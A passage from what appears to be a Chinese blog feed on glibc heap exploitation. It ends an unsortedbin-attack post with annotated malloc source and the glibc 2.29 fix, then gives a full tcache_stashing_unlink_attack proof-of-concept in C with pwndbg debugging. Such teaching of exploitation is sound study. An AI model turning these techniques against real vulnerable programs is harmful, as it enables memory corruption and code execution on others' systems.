(victim)</span><br><span class="line">   &gt; av-&gt;system_mem, <span class="number">0</span>)) <span class="comment">//检查堆块的大小是否异常</span></span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): memory corruption&quot;</span>);</span><br><span class="line">        size = chunksize (victim); <span class="comment">//size==0x420</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">           only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">           runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">           exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">           no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">            bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">            victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE)) <span class="comment">//不会进入此if语句</span></span><br><span class="line">          &#123;</span><br><span class="line">            ......</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">        unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>由于这次申请的堆块大小为 0x410，和 unsortedbin 中的 free chunk 大小相同，这里首先对 unsortedbin 中的 free chunk 进行解链，解链后会向 stack_var 写入一个超大值，这个值是&amp;main_arena，整个过程详见如下 PPT：</p><blockquote><p><strong>注意：在 glibc 2.27 中此过程没有任何检查</strong></p></blockquote><p>之后会直接返回申请的 victim 即 0x555555757250（chunk_victim）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>最终结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621328773304-e8961c0c-ea5a-436c-917c-1d440f467b14.png#align=left&display=inline&height=746&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-18%2017.06.04.png&originHeight=746&originWidth=2746&size=99687&status=done&style=none&width=2746" alt="截屏2021-05-18 17.06.04.png"><br>另外再多说几句：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621329011783-31958d52-c952-4654-a6d7-799e73bd5099.png#align=left&display=inline&height=1616&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-18%2017.09.58.png&originHeight=1616&originWidth=2880&size=562478&status=done&style=none&width=2880" alt="截屏2021-05-18 17.09.58.png"><br>如上图所示，在那时虽然 stack_var 的 bk 已经被设置，但是是没有用的，因为之后在解链时会进行重新设置：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621329103323-f131e835-2dc2-4a8a-a4ef-ccb543bfeb5c.png#align=left&display=inline&height=1610&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-18%2017.11.36.png&originHeight=1610&originWidth=2880&size=587777&status=done&style=none&width=2880" alt="截屏2021-05-18 17.11.36.png"><br>这里会牵扯到栈布局，也就是说 stack_var 的 bk 指针是没有必要设置的 😂，实际上 stack_var 的 fd 和 bk 位都不需要设置。</p><h1 id="漏洞封堵"><a href="#漏洞封堵" class="headerlink" title="漏洞封堵"></a>漏洞封堵</h1><p>以下代码是 glibc 2.29 的 malloc 源码：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621329733425-4072a257-0542-43e9-9bda-1c6cef23017b.png#align=left&display=inline&height=638&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-18%2017.22.05.png&originHeight=638&originWidth=1946&size=298003&status=done&style=none&width=1946" alt="截屏2021-05-18 17.22.05.png"><br>主要是这一句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>这一句话对 unsortedbin attack 是致命的，这会导致此种攻击方式几乎不可用：</strong><br><strong><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621330310479-8bbf8bb1-0efc-4859-bc08-93d286e2130a.png#align=left&display=inline&height=1800&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-18%2017.31.43.png&originHeight=1800&originWidth=2880&size=267050&status=done&style=none&width=2880" alt="截屏2021-05-18 17.31.43.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621330322146-418fa8db-7380-4f82-bc95-afa159337fad.png#align=left&display=inline&height=1800&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-18%2017.31.54.png&originHeight=1800&originWidth=2880&size=271110&status=done&style=none&width=2880" alt="截屏2021-05-18 17.31.54.png"></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(13)-tcache_stashing_unlink_attack</title>
    <link href="https://cyberangel.cn/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/"/>
    <id>https://cyberangel.cn/2021/05/17/how2heap(13)-tcache_stashing_unlink_attack/</id>
    <published>2021-05-17T02:16:40.000Z</published>
    <updated>2021-07-04T09:57:11.749Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一小节我们来看 tcache_stashing_unlink_attack 这种攻击方式，这种攻击方式的原理仍然是对 smallbin 中 free chunk 的 bk 指针进行修改（和上一节的 house of lore 原理相同），但是此种方式需要 calloc 函数</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>具有或开启 tcache 机制的 glibc malloc</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC-源码"><a href="#POC-源码" class="headerlink" title="POC 源码"></a>POC 源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="POC-调试"><a href="#POC-调试" class="headerlink" title="POC 调试"></a>POC 调试</h2><p>我们对代码第 24 行下断点，然后我们开始调试，首先我们来看程序所需要的一些数据，这里在 stack_var 上伪造了一个地址，这个地址的作用之后再说：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">   setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">   ......</span><br><span class="line">stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx chunk_lis</span><br><span class="line"><span class="number">0x7fffffffdd40</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd50</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd60</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx stack_var</span><br><span class="line"><span class="number">0x7fffffffdcc0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcd0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00007fffffffdcd0</span></span><br><span class="line">    #stack_var[<span class="number">3</span>]</span><br><span class="line"><span class="number">0x7fffffffdce0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdcf0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后 POC 中打印了一些消息（b 29-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">You can see the value of fake_chunk-&gt;bk is:<span class="number">0x7fffffffdcd0</span></span><br><span class="line"></span><br><span class="line">Also, let<span class="number">&#x27;</span>s see the initial value of stack_var[<span class="number">4</span>]:(nil)</span><br><span class="line"></span><br><span class="line">Now we alloc <span class="number">9</span> chunks with <span class="built_in">malloc</span>.</span><br></pre></td></tr></table></figure><p>接下来我们在堆上创建了 9 个大小在 tcachebin 范围内的堆块，每个堆块返回的指针会保存在 chunk_lis 数组中（b 34-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//now we malloc 9 chunks</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">0</span>]</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557572f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">1</span>]</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757390</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">2</span>]</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757430</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">3</span>]</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557574d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">4</span>]</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757570</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">5</span>]</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757610</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">6</span>]</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557576b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">7</span>]</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757750</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000000a1</span> #chunk_lis[<span class="number">8</span>]</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557577f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020811</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx chunk_lis</span><br><span class="line"><span class="number">0x7fffffffdd40</span>:<span class="number">0x0000555555757260</span><span class="number">0x0000555555757300</span></span><br><span class="line"><span class="number">0x7fffffffdd50</span>:<span class="number">0x00005555557573a0</span><span class="number">0x0000555555757440</span></span><br><span class="line"><span class="number">0x7fffffffdd60</span>:<span class="number">0x00005555557574e0</span><span class="number">0x0000555555757580</span></span><br><span class="line"><span class="number">0x7fffffffdd70</span>:<span class="number">0x0000555555757620</span><span class="number">0x00005555557576c0</span></span><br><span class="line"><span class="number">0x7fffffffdd80</span>:<span class="number">0x0000555555757760</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdd90</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我释放刚刚创建的后 6 个堆块以填充对应大小链表的 tcachebin（b 49-&gt;c），free 掉后 3 个堆块让其中的两个堆块进入 unsortedbin 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//put 7 chunks into tcache</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//last tcache bin</span></span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//now they are put into unsorted bin</span></span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 